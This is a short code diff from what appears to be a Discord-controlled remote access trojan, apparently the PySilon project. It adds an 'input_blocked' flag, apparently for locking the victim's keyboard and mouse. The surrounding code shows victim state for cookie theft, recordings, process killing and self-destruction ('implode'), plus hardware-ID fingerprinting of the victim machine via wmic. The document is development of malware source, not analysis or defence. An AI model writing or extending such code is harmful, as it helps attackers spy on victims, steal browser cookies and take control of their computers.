@@ -159,7 +159,7 @@ messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 cookies_thread, implode_confirmation, cmd_messages = None, None, []
-send_recordings = True
+send_recordings, input_blocked = True, False
 latest_messages_in_recordings = []
 # [pysilon_var] !registry 0
 
@@ -167,7 +167,7 @@ working_directory = ['C:', 'Users', getuser(), software_directory_name]
 
 @client.event
 async def on_ready():
-    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
+    global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings, input_blocked
     hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
 
     first_run = True
